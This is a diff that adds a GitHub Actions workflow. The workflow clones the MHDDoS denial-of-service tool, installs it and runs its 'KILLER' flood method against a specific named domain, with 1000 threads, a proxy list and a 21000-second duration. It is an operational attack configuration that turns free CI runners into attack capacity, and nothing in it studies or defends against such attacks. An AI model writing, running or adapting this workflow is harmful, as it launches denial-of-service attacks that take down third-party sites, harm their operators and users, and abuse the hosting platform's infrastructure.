@@ -1,0 +1,30 @@
+name: Setup and Run MHDDoS Tool
+
+on: 
+    workflow_dispatch:
+
+jobs:
+  setup-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v2
+
+    - name: Update and Upgrade System Packages
+      run: |
+        sudo apt update -y
+        sudo apt upgrade -y
+
+    - name: Clone MHDDoS Repository
+      run: |
+        git clone https://github.com/MatrixTM/MHDDoS.git
+        cd MHDDoS
+
+    - name: Install Python Dependencies
+      run: |
+        pip install -r MHDDoS/requirements.txt
+
+    - name: Run MHDDoS Tool
+      run: |
+        python3 MHDDoS/start.py KILLER https://xn--mgbfb0a3b7d15c.com 4 1000 proxyy.txt 21000
